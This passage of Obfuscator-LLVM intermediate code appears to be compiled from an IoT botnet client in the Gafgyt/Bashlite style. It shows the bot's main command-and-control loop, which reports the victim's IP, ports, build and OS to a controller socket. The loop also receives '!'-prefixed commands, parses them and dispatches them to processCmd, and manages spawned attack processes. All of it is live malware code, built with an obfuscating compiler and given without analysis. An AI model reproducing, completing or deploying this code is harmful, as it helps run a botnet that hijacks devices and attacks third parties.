; <label>:30:                                     ; preds = %.backedge72
  %31 = call i32 @sleep(i32 5) #7
  br label %.backedge72.backedge

; <label>:32:                                     ; preds = %.backedge72
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %35 = call i8* @inet_ntoa(i32 %34) #7
  %36 = call i8* @getPortz()
  %37 = call i8* @getBuildz()
  %38 = call i8* @getOS()
  %39 = call i32 (i32, i8*, ...) @sockprintf(i32 %33, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.39, i64 0, i64 0), i8* %35, i8* %36, i8* %37, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i64 0, i64 0), i8* %38)
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = call i32 @recvLine(i32 %40, i8* nonnull %25, i32 4096)
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %.backedge72.backedge, label %.preheader70.preheader

.backedge72.backedge:                             ; preds = %32, %30, %.backedge72.loopexit
  br label %.backedge72

.preheader70.preheader:                           ; preds = %32
  br label %.preheader70

.preheader70:                                     ; preds = %.preheader70.preheader, %.backedge
  %43 = phi i32 [ %142, %.backedge ], [ %41, %.preheader70.preheader ]
  %44 = load i64, i64* @numpids, align 8
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge86, label %.lr.ph85.preheader

.lr.ph85.preheader:                               ; preds = %.preheader70
  br label %.lr.ph85

.lr.ph85:                                         ; preds = %.lr.ph85.preheader, %88
  %indvars.iv = phi i64 [ %indvars.iv.next, %88 ], [ 0, %.lr.ph85.preheader ]
  %46 = load i32*, i32** @pids, align 8
  %47 = getelementptr inbounds i32, i32* %46, i64 %indvars.iv
  %48 = load i32, i32* %47, align 4
  %49 = call i32 @waitpid(i32 %48, i32* null, i32 1) #7
  %50 = icmp sgt i32 %49, 0
  br i1 %50, label %.preheader, label %88

.preheader:                                       ; preds = %.lr.ph85
  %51 = add nuw i64 %indvars.iv, 1
  %52 = load i64, i64* @numpids, align 8
  %53 = icmp ult i64 %51, %52
  %54 = load i32*, i32** @pids, align 8
  %55 = trunc i64 %indvars.iv to i32
  br i1 %53, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %56 = trunc i64 %51 to i32
  %57 = trunc i64 %indvars.iv to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %58 = phi i32* [ %67, %.lr.ph ], [ %54, %.lr.ph.preheader ]
  %59 = phi i64 [ %64, %.lr.ph ], [ %51, %.lr.ph.preheader ]
  %.06177 = phi i32 [ %.061, %.lr.ph ], [ %56, %.lr.ph.preheader ]
  %.061.in76 = phi i32 [ %.06177, %.lr.ph ], [ %57, %.lr.ph.preheader ]
  %60 = getelementptr inbounds i32, i32* %58, i64 %59
  %61 = load i32, i32* %60, align 4
  %62 = zext i32 %.061.in76 to i64
  %63 = getelementptr inbounds i32, i32* %58, i64 %62
  store i32 %61, i32* %63, align 4
  %.061 = add i32 %.06177, 1
  %64 = zext i32 %.061 to i64
  %65 = load i64, i64* @numpids, align 8
  %66 = icmp ult i64 %64, %65
  %67 = load i32*, i32** @pids, align 8
  br i1 %66, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.061.in.lcssa = phi i32 [ %55, %.preheader ], [ %.06177, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %54, %.preheader ], [ %67, %._crit_edge.loopexit ]
  %68 = zext i32 %.061.in.lcssa to i64
  %69 = getelementptr inbounds i32, i32* %.lcssa, i64 %68
  store i32 0, i32* %69, align 4
  %70 = load i64, i64* @numpids, align 8
  %71 = add i64 %70, -1
  store i64 %71, i64* @numpids, align 8
  %72 = shl i64 %70, 2
  %73 = call noalias i8* @malloc(i64 %72) #7
  %74 = bitcast i8* %73 to i32*
  %75 = icmp eq i64 %71, 0
  %76 = load i32*, i32** @pids, align 8
  br i1 %75, label %._crit_edge82, label %.lr.ph81.preheader

.lr.ph81.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph81

.lr.ph81:                                         ; preds = %.lr.ph81.preheader, %.lr.ph81
  %77 = phi i32* [ %86, %.lr.ph81 ], [ %76, %.lr.ph81.preheader ]
  %78 = phi i64 [ %83, %.lr.ph81 ], [ 0, %.lr.ph81.preheader ]
  %.16279 = phi i32 [ %82, %.lr.ph81 ], [ 0, %.lr.ph81.preheader ]
  %79 = getelementptr inbounds i32, i32* %77, i64 %78
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i32, i32* %74, i64 %78
  store i32 %80, i32* %81, align 4
  %82 = add i32 %.16279, 1
  %83 = zext i32 %82 to i64
  %84 = load i64, i64* @numpids, align 8
  %85 = icmp ult i64 %83, %84
  %86 = load i32*, i32** @pids, align 8
  br i1 %85, label %.lr.ph81, label %._crit_edge82.loopexit

._crit_edge82.loopexit:                           ; preds = %.lr.ph81
  br label %._crit_edge82

._crit_edge82:                                    ; preds = %._crit_edge82.loopexit, %._crit_edge
  %.lcssa73 = phi i32* [ %76, %._crit_edge ], [ %86, %._crit_edge82.loopexit ]
  %87 = bitcast i32* %.lcssa73 to i8*
  call void @free(i8* %87) #7
  store i8* %73, i8** bitcast (i32** @pids to i8**), align 8
  br label %88

; <label>:88:                                     ; preds = %.lr.ph85, %._crit_edge82
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %89 = ashr exact i64 %sext, 32
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp ult i64 %89, %90
  br i1 %91, label %.lr.ph85, label %._crit_edge86.loopexit

._crit_edge86.loopexit:                           ; preds = %88
  br label %._crit_edge86

._crit_edge86:                                    ; preds = %._crit_edge86.loopexit, %.preheader70
  %92 = sext i32 %43 to i64
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %92
  store i8 0, i8* %93, align 1
  call void @trim(i8* nonnull %25)
  %94 = load i8, i8* %25, align 16
  %95 = icmp eq i8 %94, 33
  br i1 %95, label %.preheader99.preheader, label %.backedge

.preheader99.preheader:                           ; preds = %._crit_edge86
  br label %.preheader99

.preheader99:                                     ; preds = %.preheader99.preheader, %97
  %.059 = phi i8* [ %98, %97 ], [ %26, %.preheader99.preheader ]
  %96 = load i8, i8* %.059, align 1
  switch i8 %96, label %97 [
    i8 0, label %.backedge.loopexit115
    i8 32, label %99
  ]

; <label>:97:                                     ; preds = %.preheader99
  %98 = getelementptr inbounds i8, i8* %.059, i64 1
  br label %.preheader99

; <label>:99:                                     ; preds = %.preheader99
  store i8 0, i8* %.059, align 1
  %100 = call i64 @strlen(i8* %26) #14
  %101 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %100
  %102 = getelementptr inbounds i8, i8* %101, i64 2
  br label %103

; <label>:103:                                    ; preds = %108, %99
  %104 = call i64 @strlen(i8* %102) #14
  %105 = add i64 %104, -1
  %106 = getelementptr inbounds i8, i8* %102, i64 %105
  %107 = load i8, i8* %106, align 1
  switch i8 %107, label %.preheader68.preheader [
    i8 13, label %108
    i8 10, label %108
  ]

.preheader68.preheader:                           ; preds = %103
  br label %.preheader68

; <label>:108:                                    ; preds = %103, %103
  store i8 0, i8* %106, align 1
  br label %103

.preheader68:                                     ; preds = %.preheader68.preheader, %110
  %.060 = phi i8* [ %111, %110 ], [ %102, %.preheader68.preheader ]
  %109 = load i8, i8* %.060, align 1
  switch i8 %109, label %110 [
    i8 32, label %112
    i8 0, label %112
  ]

; <label>:110:                                    ; preds = %.preheader68
  %111 = getelementptr inbounds i8, i8* %.060, i64 1
  br label %.preheader68

; <label>:112:                                    ; preds = %.preheader68, %.preheader68
  store i8 0, i8* %.060, align 1
  %113 = getelementptr inbounds i8, i8* %.060, i64 1
  %114 = load i8, i8* %102, align 1
  %115 = icmp eq i8 %114, 0
  br i1 %115, label %._crit_edge90, label %.lr.ph89.preheader

.lr.ph89.preheader:                               ; preds = %112
  br label %.lr.ph89

.lr.ph89:                                         ; preds = %.lr.ph89.preheader, %.lr.ph89
  %116 = phi i8 [ %121, %.lr.ph89 ], [ %114, %.lr.ph89.preheader ]
  %.05887 = phi i8* [ %120, %.lr.ph89 ], [ %102, %.lr.ph89.preheader ]
  %117 = zext i8 %116 to i32
  %118 = call i32 @toupper(i32 %117) #14
  %119 = trunc i32 %118 to i8
  store i8 %119, i8* %.05887, align 1
  %120 = getelementptr inbounds i8, i8* %.05887, i64 1
  %121 = load i8, i8* %120, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %._crit_edge90.loopexit, label %.lr.ph89

._crit_edge90.loopexit:                           ; preds = %.lr.ph89
  br label %._crit_edge90

._crit_edge90:                                    ; preds = %._crit_edge90.loopexit, %112
  %123 = call i8* @strtok(i8* %113, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i64 0, i64 0)) #7
  store i8* %102, i8** %27, align 16
  %124 = icmp eq i8* %123, null
  br i1 %124, label %._crit_edge95.thread, label %.lr.ph94.preheader

.lr.ph94.preheader:                               ; preds = %._crit_edge90
  br label %.lr.ph94

._crit_edge95.thread:                             ; preds = %._crit_edge90
  call void @processCmd(i32 1, i8** nonnull %27)
  br label %.backedge

.lr.ph94:                                         ; preds = %.lr.ph94.preheader, %137
  %.05692 = phi i8* [ %138, %137 ], [ %123, %.lr.ph94.preheader ]
  %.05791 = phi i32 [ %.1, %137 ], [ 1, %.lr.ph94.preheader ]
  %125 = load i8, i8* %.05692, align 1
  %126 = icmp eq i8 %125, 10
  br i1 %126, label %137, label %127

; <label>:127:                                    ; preds = %.lr.ph94
  %128 = call i64 @strlen(i8* nonnull %.05692) #14
  %129 = add i64 %128, 1
  %130 = call noalias i8* @malloc(i64 %129) #7
  %131 = sext i32 %.05791 to i64
  %132 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %131
  store i8* %130, i8** %132, align 8
  %133 = call i64 @strlen(i8* nonnull %.05692) #14
  %134 = add i64 %133, 1
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 %134, i32 1, i1 false)
  %135 = call i8* @strcpy(i8* %130, i8* nonnull %.05692) #7
  %136 = add nsw i32 %.05791, 1
  br label %137

; <label>:137:                                    ; preds = %.lr.ph94, %127
  %.1 = phi i32 [ %136, %127 ], [ %.05791, %.lr.ph94 ]
  %138 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i64 0, i64 0)) #7
  %139 = icmp eq i8* %138, null
  br i1 %139, label %._crit_edge95, label %.lr.ph94

._crit_edge95:                                    ; preds = %137
  call void @processCmd(i32 %.1, i8** nonnull %27)
  %140 = icmp sgt i32 %.1, 1
  br i1 %140, label %.lr.ph98.preheader, label %.backedge

.lr.ph98.preheader:                               ; preds = %._crit_edge95
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph98

.backedge.loopexit:                               ; preds = %.lr.ph98
  br label %.backedge

.backedge.loopexit115:                            ; preds = %.preheader99
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit115, %.backedge.loopexit, %._crit_edge95.thread, %._crit_edge95, %._crit_edge86
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 @recvLine(i32 %141, i8* nonnull %25, i32 4096)
  %143 = icmp eq i32 %142, -1
  br i1 %143, label %.backedge72.loopexit, label %.preheader70

.lr.ph98:                                         ; preds = %.lr.ph98.preheader, %.lr.ph98
  %indvars.iv105 = phi i64 [ %indvars.iv.next106, %.lr.ph98 ], [ 1, %.lr.ph98.preheader ]
  %144 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %indvars.iv105
  %145 = load i8*, i8** %144, align 8
  call void @free(i8* %145) #7
  %indvars.iv.next106 = add nuw nsw i64 %indvars.iv105, 1
  %exitcond = icmp eq i64 %indvars.iv.next106, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph98
}

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #12

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #6

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { nounwind readnone }
attributes #14 = { nounwind readonly }
attributes #15 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146660393}
!2 = !{i32 -2146658953}
!3 = distinct !{!3, !4}
!4 = !{!"llvm.loop.unroll.disable"}
